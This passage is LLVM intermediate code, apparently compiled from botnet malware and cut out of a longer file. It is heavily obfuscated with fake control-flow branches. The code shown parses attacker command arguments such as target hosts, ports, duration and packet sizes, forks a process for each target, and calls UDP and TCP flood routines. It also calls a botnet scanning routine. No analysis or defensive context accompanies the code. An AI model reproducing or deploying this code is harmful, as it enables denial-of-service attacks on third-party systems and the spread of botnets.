  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %113
  br label %1059

; <label>:117:                                    ; preds = %113
  br label %118

; <label>:118:                                    ; preds = %117
  %119 = load i32, i32* %15, align 4
  %120 = load i32, i32* %14, align 4
  call void @botnetTScan(i32 %119, i32 %120)
  call void @_exit(i32 0) #12
  unreachable

; <label>:121:                                    ; preds = %81
  %122 = load i32, i32* @x.97
  %123 = load i32, i32* @y.98
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  %130 = load i32, i32* @x.97
  %131 = load i32, i32* @y.98
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %138

; <label>:138:                                    ; preds = %originalBBpart212, %originalBBpart2
  %139 = load i8**, i8*** %12, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 0
  %141 = load i8*, i8** %140, align 8
  %142 = call i32 @strcmp(i8* %141, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.300, i32 0, i32 0)) #9
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %383, label %144

; <label>:144:                                    ; preds = %138
  %145 = load i32, i32* @x.97
  %146 = load i32, i32* @y.98
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %144
  %153 = load i32, i32* %11, align 4
  %154 = icmp slt i32 %153, 6
  %155 = load i32, i32* @x.97
  %156 = load i32, i32* @y.98
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %154, label %246, label %163

; <label>:163:                                    ; preds = %originalBBpart216
  %164 = load i8**, i8*** %12, align 8
  %165 = getelementptr inbounds i8*, i8** %164, i64 3
  %166 = load i8*, i8** %165, align 8
  %167 = call i32 @atoi(i8* %166) #9
  %168 = icmp eq i32 %167, -1
  br i1 %168, label %246, label %169

; <label>:169:                                    ; preds = %163
  %170 = load i32, i32* @x.97
  %171 = load i32, i32* @y.98
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %169
  %178 = load i8**, i8*** %12, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 2
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #9
  %182 = icmp eq i32 %181, -1
  %183 = load i32, i32* @x.97
  %184 = load i32, i32* @y.98
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %182, label %246, label %191

; <label>:191:                                    ; preds = %originalBBpart220
  %192 = load i8**, i8*** %12, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 4
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #9
  %196 = icmp eq i32 %195, -1
  br i1 %196, label %246, label %197

; <label>:197:                                    ; preds = %191
  %198 = load i8**, i8*** %12, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 5
  %200 = load i8*, i8** %199, align 8
  %201 = call i32 @atoi(i8* %200) #9
  %202 = icmp eq i32 %201, -1
  br i1 %202, label %246, label %203

; <label>:203:                                    ; preds = %197
  %204 = load i8**, i8*** %12, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 5
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @atoi(i8* %206) #9
  %208 = icmp sgt i32 %207, 65536
  br i1 %208, label %246, label %209

; <label>:209:                                    ; preds = %203
  %210 = load i32, i32* @x.97
  %211 = load i32, i32* @y.98
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %209
  %218 = load i8**, i8*** %12, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 5
  %220 = load i8*, i8** %219, align 8
  %221 = call i32 @atoi(i8* %220) #9
  %222 = icmp sgt i32 %221, 65500
  %223 = load i32, i32* @x.97
  %224 = load i32, i32* @y.98
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %222, label %246, label %231

; <label>:231:                                    ; preds = %originalBBpart224
  %232 = load i8**, i8*** %12, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 4
  %234 = load i8*, i8** %233, align 8
  %235 = call i32 @atoi(i8* %234) #9
  %236 = icmp sgt i32 %235, 32
  br i1 %236, label %246, label %237

; <label>:237:                                    ; preds = %231
  %238 = load i32, i32* %11, align 4
  %239 = icmp eq i32 %238, 7
  br i1 %239, label %240, label %247

; <label>:240:                                    ; preds = %237
  %241 = load i8**, i8*** %12, align 8
  %242 = getelementptr inbounds i8*, i8** %241, i64 6
  %243 = load i8*, i8** %242, align 8
  %244 = call i32 @atoi(i8* %243) #9
  %245 = icmp slt i32 %244, 1
  br i1 %245, label %246, label %247

; <label>:246:                                    ; preds = %240, %231, %originalBBpart224, %203, %197, %191, %originalBBpart220, %163, %originalBBpart216
  br label %1059

; <label>:247:                                    ; preds = %240, %237
  %248 = load i8**, i8*** %12, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 1
  %250 = load i8*, i8** %249, align 8
  store i8* %250, i8** %16, align 8
  %251 = load i8**, i8*** %12, align 8
  %252 = getelementptr inbounds i8*, i8** %251, i64 2
  %253 = load i8*, i8** %252, align 8
  %254 = call i32 @atoi(i8* %253) #9
  store i32 %254, i32* %17, align 4
  %255 = load i8**, i8*** %12, align 8
  %256 = getelementptr inbounds i8*, i8** %255, i64 3
  %257 = load i8*, i8** %256, align 8
  %258 = call i32 @atoi(i8* %257) #9
  store i32 %258, i32* %18, align 4
  %259 = load i8**, i8*** %12, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 4
  %261 = load i8*, i8** %260, align 8
  %262 = call i32 @atoi(i8* %261) #9
  store i32 %262, i32* %19, align 4
  %263 = load i8**, i8*** %12, align 8
  %264 = getelementptr inbounds i8*, i8** %263, i64 5
  %265 = load i8*, i8** %264, align 8
  %266 = call i32 @atoi(i8* %265) #9
  store i32 %266, i32* %20, align 4
  %267 = load i32, i32* %11, align 4
  %268 = icmp sgt i32 %267, 6
  br i1 %268, label %269, label %274

; <label>:269:                                    ; preds = %247
  %270 = load i8**, i8*** %12, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 6
  %272 = load i8*, i8** %271, align 8
  %273 = call i32 @atoi(i8* %272) #9
  br label %275

; <label>:274:                                    ; preds = %247
  br label %275

; <label>:275:                                    ; preds = %274, %269
  %276 = phi i32 [ %273, %269 ], [ 1000, %274 ]
  store i32 %276, i32* %21, align 4
  %277 = load i32, i32* %11, align 4
  %278 = icmp sgt i32 %277, 7
  br i1 %278, label %279, label %300

; <label>:279:                                    ; preds = %275
  %280 = load i32, i32* @x.97
  %281 = load i32, i32* @y.98
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %279
  %288 = load i8**, i8*** %12, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 7
  %290 = load i8*, i8** %289, align 8
  %291 = call i32 @atoi(i8* %290) #9
  %292 = load i32, i32* @x.97
  %293 = load i32, i32* @y.98
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %317

; <label>:300:                                    ; preds = %275
  %301 = load i32, i32* @x.97
  %302 = load i32, i32* @y.98
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %300
  %309 = load i32, i32* @x.97
  %310 = load i32, i32* @y.98
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %317

; <label>:317:                                    ; preds = %originalBBpart232, %originalBBpart228
  %318 = phi i32 [ %291, %originalBBpart228 ], [ 1000000, %originalBBpart232 ]
  store i32 %318, i32* %22, align 4
  %319 = load i32, i32* %11, align 4
  %320 = icmp sgt i32 %319, 8
  br i1 %320, label %321, label %342

; <label>:321:                                    ; preds = %317
  %322 = load i32, i32* @x.97
  %323 = load i32, i32* @y.98
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %321
  %330 = load i8**, i8*** %12, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 8
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #9
  %334 = load i32, i32* @x.97
  %335 = load i32, i32* @y.98
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %343

; <label>:342:                                    ; preds = %317
  br label %343

; <label>:343:                                    ; preds = %342, %originalBBpart236
  %344 = phi i32 [ %333, %originalBBpart236 ], [ 0, %342 ]
  store i32 %344, i32* %23, align 4
  %345 = load i8*, i8** %16, align 8
  %346 = call i8* @strstr(i8* %345, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #9
  %347 = icmp ne i8* %346, null
  br i1 %347, label %348, label %369

; <label>:348:                                    ; preds = %343
  %349 = load i8*, i8** %16, align 8
  %350 = call i8* @strtok(i8* %349, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #3
  store i8* %350, i8** %24, align 8
  br label %351

; <label>:351:                                    ; preds = %366, %348
  %352 = load i8*, i8** %24, align 8
  %353 = icmp ne i8* %352, null
  br i1 %353, label %354, label %368

; <label>:354:                                    ; preds = %351
  %355 = call i32 @listFork()
  %356 = icmp ne i32 %355, 0
  br i1 %356, label %366, label %357

; <label>:357:                                    ; preds = %354
  %358 = load i8*, i8** %24, align 8
  %359 = load i32, i32* %17, align 4
  %360 = load i32, i32* %18, align 4
  %361 = load i32, i32* %19, align 4
  %362 = load i32, i32* %20, align 4
  %363 = load i32, i32* %21, align 4
  %364 = load i32, i32* %22, align 4
  %365 = load i32, i32* %23, align 4
  call void @sendUDP(i8* %358, i32 %359, i32 %360, i32 %361, i32 %362, i32 %363, i32 %364, i32 %365)
  call void @_exit(i32 0) #12
  unreachable

; <label>:366:                                    ; preds = %354
  %367 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #3
  store i8* %367, i8** %24, align 8
  br label %351

; <label>:368:                                    ; preds = %351
  br label %382

; <label>:369:                                    ; preds = %343
  %370 = call i32 @listFork()
  %371 = icmp ne i32 %370, 0
  br i1 %371, label %381, label %372

; <label>:372:                                    ; preds = %369
  %373 = load i8*, i8** %16, align 8
  %374 = load i32, i32* %17, align 4
  %375 = load i32, i32* %18, align 4
  %376 = load i32, i32* %19, align 4
  %377 = load i32, i32* %20, align 4
  %378 = load i32, i32* %21, align 4
  %379 = load i32, i32* %22, align 4
  %380 = load i32, i32* %23, align 4
  call void @sendUDP(i8* %373, i32 %374, i32 %375, i32 %376, i32 %377, i32 %378, i32 %379, i32 %380)
  call void @_exit(i32 0) #12
  unreachable

; <label>:381:                                    ; preds = %369
  br label %382

; <label>:382:                                    ; preds = %381, %368
  br label %1059

; <label>:383:                                    ; preds = %138
  %384 = load i8**, i8*** %12, align 8
  %385 = getelementptr inbounds i8*, i8** %384, i64 0
  %386 = load i8*, i8** %385, align 8
  %387 = call i32 @strcmp(i8* %386, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.301, i32 0, i32 0)) #9
  %388 = icmp ne i32 %387, 0
  br i1 %388, label %638, label %389

; <label>:389:                                    ; preds = %383
  %390 = load i32, i32* %11, align 4
  %391 = icmp slt i32 %390, 6
  br i1 %391, label %466, label %392

; <label>:392:                                    ; preds = %389
  %393 = load i8**, i8*** %12, align 8
  %394 = getelementptr inbounds i8*, i8** %393, i64 3
  %395 = load i8*, i8** %394, align 8
  %396 = call i32 @atoi(i8* %395) #9
  %397 = icmp eq i32 %396, -1
  br i1 %397, label %466, label %398

; <label>:398:                                    ; preds = %392
  %399 = load i32, i32* @x.97
  %400 = load i32, i32* @y.98
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %398
  %407 = load i8**, i8*** %12, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 2
  %409 = load i8*, i8** %408, align 8
  %410 = call i32 @atoi(i8* %409) #9
  %411 = icmp eq i32 %410, -1
  %412 = load i32, i32* @x.97
  %413 = load i32, i32* @y.98
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %411, label %466, label %420

; <label>:420:                                    ; preds = %originalBBpart240
  %421 = load i8**, i8*** %12, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 4
  %423 = load i8*, i8** %422, align 8
  %424 = call i32 @atoi(i8* %423) #9
  %425 = icmp eq i32 %424, -1
  br i1 %425, label %466, label %426

; <label>:426:                                    ; preds = %420
  %427 = load i8**, i8*** %12, align 8
  %428 = getelementptr inbounds i8*, i8** %427, i64 4
  %429 = load i8*, i8** %428, align 8
  %430 = call i32 @atoi(i8* %429) #9
  %431 = icmp sgt i32 %430, 32
  br i1 %431, label %466, label %432

; <label>:432:                                    ; preds = %426
  %433 = load i32, i32* %11, align 4
  %434 = icmp sgt i32 %433, 6
  br i1 %434, label %435, label %441

; <label>:435:                                    ; preds = %432
  %436 = load i8**, i8*** %12, align 8
  %437 = getelementptr inbounds i8*, i8** %436, i64 6
  %438 = load i8*, i8** %437, align 8
  %439 = call i32 @atoi(i8* %438) #9
  %440 = icmp slt i32 %439, 0
  br i1 %440, label %466, label %441

; <label>:441:                                    ; preds = %435, %432
  %442 = load i32, i32* @x.97
  %443 = load i32, i32* @y.98
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %441
  %450 = load i32, i32* %11, align 4
  %451 = icmp eq i32 %450, 8
  %452 = load i32, i32* @x.97
  %453 = load i32, i32* @y.98
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %451, label %460, label %467

; <label>:460:                                    ; preds = %originalBBpart244
  %461 = load i8**, i8*** %12, align 8
  %462 = getelementptr inbounds i8*, i8** %461, i64 7
  %463 = load i8*, i8** %462, align 8
  %464 = call i32 @atoi(i8* %463) #9
  %465 = icmp slt i32 %464, 1
  br i1 %465, label %466, label %467

; <label>:466:                                    ; preds = %460, %435, %426, %420, %originalBBpart240, %392, %389
  br label %1059

; <label>:467:                                    ; preds = %460, %originalBBpart244
  %468 = load i32, i32* @x.97
  %469 = load i32, i32* @y.98
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %467
  %476 = load i8**, i8*** %12, align 8
  %477 = getelementptr inbounds i8*, i8** %476, i64 1
  %478 = load i8*, i8** %477, align 8
  store i8* %478, i8** %25, align 8
  %479 = load i8**, i8*** %12, align 8
  %480 = getelementptr inbounds i8*, i8** %479, i64 2
  %481 = load i8*, i8** %480, align 8
  %482 = call i32 @atoi(i8* %481) #9
  store i32 %482, i32* %26, align 4
  %483 = load i8**, i8*** %12, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 3
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @atoi(i8* %485) #9
  store i32 %486, i32* %27, align 4
  %487 = load i8**, i8*** %12, align 8
  %488 = getelementptr inbounds i8*, i8** %487, i64 4
  %489 = load i8*, i8** %488, align 8
  %490 = call i32 @atoi(i8* %489) #9
  store i32 %490, i32* %28, align 4
  %491 = load i8**, i8*** %12, align 8
  %492 = getelementptr inbounds i8*, i8** %491, i64 5
  %493 = load i8*, i8** %492, align 8
  store i8* %493, i8** %29, align 8
  %494 = load i32, i32* %11, align 4
  %495 = icmp eq i32 %494, 8
  %496 = load i32, i32* @x.97
  %497 = load i32, i32* @y.98
  %498 = sub i32 %496, 1
  %499 = mul i32 %496, %498
  %500 = urem i32 %499, 2
  %501 = icmp eq i32 %500, 0
  %502 = icmp slt i32 %497, 10
  %503 = or i1 %501, %502
  br i1 %503, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %495, label %504, label %509

; <label>:504:                                    ; preds = %originalBBpart248
  %505 = load i8**, i8*** %12, align 8
  %506 = getelementptr inbounds i8*, i8** %505, i64 7
  %507 = load i8*, i8** %506, align 8
  %508 = call i32 @atoi(i8* %507) #9
  br label %510

; <label>:509:                                    ; preds = %originalBBpart248
  br label %510

; <label>:510:                                    ; preds = %509, %504
  %511 = phi i32 [ %508, %504 ], [ 10, %509 ]
  %512 = load i32, i32* @x.97
  %513 = load i32, i32* @y.98
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %510
  store i32 %511, i32* %30, align 4
  %520 = load i32, i32* %11, align 4
  %521 = icmp sgt i32 %520, 6
  %522 = load i32, i32* @x.97
  %523 = load i32, i32* @y.98
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %521, label %530, label %551

; <label>:530:                                    ; preds = %originalBBpart252
  %531 = load i32, i32* @x.97
  %532 = load i32, i32* @y.98
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %530
  %539 = load i8**, i8*** %12, align 8
  %540 = getelementptr inbounds i8*, i8** %539, i64 6
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @atoi(i8* %541) #9
  %543 = load i32, i32* @x.97
  %544 = load i32, i32* @y.98
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %552

; <label>:551:                                    ; preds = %originalBBpart252
  br label %552

; <label>:552:                                    ; preds = %551, %originalBBpart256
  %553 = phi i32 [ %542, %originalBBpart256 ], [ 0, %551 ]
  store i32 %553, i32* %31, align 4
  %554 = load i8*, i8** %25, align 8
  %555 = call i8* @strstr(i8* %554, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #9
  %556 = icmp ne i8* %555, null
  br i1 %556, label %557, label %593

; <label>:557:                                    ; preds = %552
  %558 = load i8*, i8** %25, align 8
  %559 = call i8* @strtok(i8* %558, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #3
  store i8* %559, i8** %32, align 8
  br label %560

; <label>:560:                                    ; preds = %574, %557
  %561 = load i8*, i8** %32, align 8
  %562 = icmp ne i8* %561, null
  br i1 %562, label %563, label %576

; <label>:563:                                    ; preds = %560
  %564 = call i32 @listFork()
  %565 = icmp ne i32 %564, 0
  br i1 %565, label %574, label %566

; <label>:566:                                    ; preds = %563
  %567 = load i8*, i8** %32, align 8
  %568 = load i32, i32* %26, align 4
  %569 = load i32, i32* %27, align 4
  %570 = load i32, i32* %28, align 4
  %571 = load i8*, i8** %29, align 8
  %572 = load i32, i32* %31, align 4
  %573 = load i32, i32* %30, align 4
  call void @sendTCP(i8* %567, i32 %568, i32 %569, i32 %570, i8* %571, i32 %572, i32 %573)
  call void @_exit(i32 0) #12
  unreachable

; <label>:574:                                    ; preds = %563
  %575 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #3
  store i8* %575, i8** %32, align 8
  br label %560

; <label>:576:                                    ; preds = %560
  %577 = load i32, i32* @x.97
  %578 = load i32, i32* @y.98
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %576
  %585 = load i32, i32* @x.97
  %586 = load i32, i32* @y.98
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %637

; <label>:593:                                    ; preds = %552
  %594 = load i32, i32* @x.97
  %595 = load i32, i32* @y.98
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %593
  %602 = call i32 @listFork()
  %603 = icmp ne i32 %602, 0
  %604 = load i32, i32* @x.97
  %605 = load i32, i32* @y.98
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %603, label %620, label %612

; <label>:612:                                    ; preds = %originalBBpart264
  %613 = load i8*, i8** %25, align 8
  %614 = load i32, i32* %26, align 4
  %615 = load i32, i32* %27, align 4
  %616 = load i32, i32* %28, align 4
  %617 = load i8*, i8** %29, align 8
  %618 = load i32, i32* %31, align 4
  %619 = load i32, i32* %30, align 4
  call void @sendTCP(i8* %613, i32 %614, i32 %615, i32 %616, i8* %617, i32 %618, i32 %619)
  call void @_exit(i32 0) #12
  unreachable

; <label>:620:                                    ; preds = %originalBBpart264
  %621 = load i32, i32* @x.97
  %622 = load i32, i32* @y.98
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %620
  %629 = load i32, i32* @x.97
  %630 = load i32, i32* @y.98
  %631 = sub i32 %629, 1
  %632 = mul i32 %629, %631
  %633 = urem i32 %632, 2
  %634 = icmp eq i32 %633, 0
  %635 = icmp slt i32 %630, 10
  %636 = or i1 %634, %635
  br i1 %636, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %637

; <label>:637:                                    ; preds = %originalBBpart268, %originalBBpart260
  br label %638

; <label>:638:                                    ; preds = %637, %383
  %639 = load i8**, i8*** %12, align 8
  %640 = getelementptr inbounds i8*, i8** %639, i64 0
  %641 = load i8*, i8** %640, align 8
  %642 = call i32 @strcmp(i8* %641, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.302, i32 0, i32 0)) #9
  %643 = icmp ne i32 %642, 0
  br i1 %643, label %751, label %644

; <label>:644:                                    ; preds = %638
  %645 = load i32, i32* %11, align 4
  %646 = icmp slt i32 %645, 6
  br i1 %646, label %675, label %647

; <label>:647:                                    ; preds = %644
  %648 = load i32, i32* @x.97
  %649 = load i32, i32* @y.98
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %647
  %656 = load i8**, i8*** %12, align 8
  %657 = getelementptr inbounds i8*, i8** %656, i64 3
  %658 = load i8*, i8** %657, align 8
  %659 = call i32 @atoi(i8* %658) #9
  %660 = icmp slt i32 %659, 1
  %661 = load i32, i32* @x.97
  %662 = load i32, i32* @y.98
  %663 = sub i32 %661, 1
  %664 = mul i32 %661, %663
  %665 = urem i32 %664, 2
  %666 = icmp eq i32 %665, 0
  %667 = icmp slt i32 %662, 10
  %668 = or i1 %666, %667
  br i1 %668, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %660, label %675, label %669

; <label>:669:                                    ; preds = %originalBBpart272
  %670 = load i8**, i8*** %12, align 8
  %671 = getelementptr inbounds i8*, i8** %670, i64 5
  %672 = load i8*, i8** %671, align 8
  %673 = call i32 @atoi(i8* %672) #9
  %674 = icmp slt i32 %673, 1
  br i1 %674, label %675, label %692

; <label>:675:                                    ; preds = %669, %originalBBpart272, %644
  %676 = load i32, i32* @x.97
  %677 = load i32, i32* @y.98
  %678 = sub i32 %676, 1
  %679 = mul i32 %676, %678
  %680 = urem i32 %679, 2
  %681 = icmp eq i32 %680, 0
  %682 = icmp slt i32 %677, 10
  %683 = or i1 %681, %682
  br i1 %683, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %675
  %684 = load i32, i32* @x.97
  %685 = load i32, i32* @y.98
  %686 = sub i32 %684, 1
  %687 = mul i32 %684, %686
  %688 = urem i32 %687, 2
  %689 = icmp eq i32 %688, 0
  %690 = icmp slt i32 %685, 10
  %691 = or i1 %689, %690
  br i1 %691, label %originalBBpart276, label %originalBB74alteredBB

